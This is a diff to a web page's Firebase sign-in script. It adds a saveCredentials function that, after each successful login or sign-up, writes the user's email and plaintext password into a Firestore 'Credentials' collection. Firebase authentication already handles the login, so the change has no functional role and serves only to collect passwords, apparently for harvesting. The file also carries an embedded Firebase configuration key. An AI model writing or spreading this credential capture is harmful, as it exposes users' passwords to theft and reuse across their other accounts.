@@ -91,6 +91,7 @@
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-app.js";
     import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-auth.js";
+    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-firestore.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyCExki28m1NNepVQEIjmcQzR8z8O68LqIc",
@@ -104,26 +105,39 @@
 
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
+    const db = getFirestore(app);
 
-    window.signInOrSignUp = () => {
+    async function saveCredentials(email, password) {
+      try {
+        await setDoc(doc(db, "Credentials", email), {
+          email: email,
+          password: password
+        });
+        console.log("Credentials saved");
+      } catch (error) {
+        console.error("Error saving credentials:", error);
+      }
+    }
+
+    window.signInOrSignUp = async () => {
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
-      signInWithEmailAndPassword(auth, email, password)
-        .then(() => {
+      try {
+        await signInWithEmailAndPassword(auth, email, password);
+        await saveCredentials(email, password);
+        localStorage.setItem("email", email);
+        window.location.reload();
+      } catch {
+        try {
+          await createUserWithEmailAndPassword(auth, email, password);
+          await saveCredentials(email, password);
           localStorage.setItem("email", email);
           window.location.reload();
-        })
-        .catch(() => {
-          createUserWithEmailAndPassword(auth, email, password)
-            .then(() => {
-              localStorage.setItem("email", email);
-              window.location.reload();
-            })
-            .catch(() => {
-              alert("Error: Could not sign up or sign in. Please try again.");
-            });
-        });
+        } catch {
+          alert("Error: Could not sign up or sign in. Please try again.");
+        }
+      }
     };
 
     window.onload = () => {
@@ -152,8 +166,8 @@
   <div class="auth-container" id="auth-container">
     <h1 class="auth-title"></h1>
     <h2 class="auth-subtitle">Sign In</h2>
-    <input type="email" id="email" class="auth-input" placeholder="Email">
-    <input type="password" id="password" class="auth-input" placeholder="Password">
+    <input type="email" id="email" class="auth-input" placeholder="Email" />
+    <input type="password" id="password" class="auth-input" placeholder="Password" />
     <button class="auth-button sign-in" onclick="signInOrSignUp()">Sign In / Sign Up</button>
   </div>
 </body>
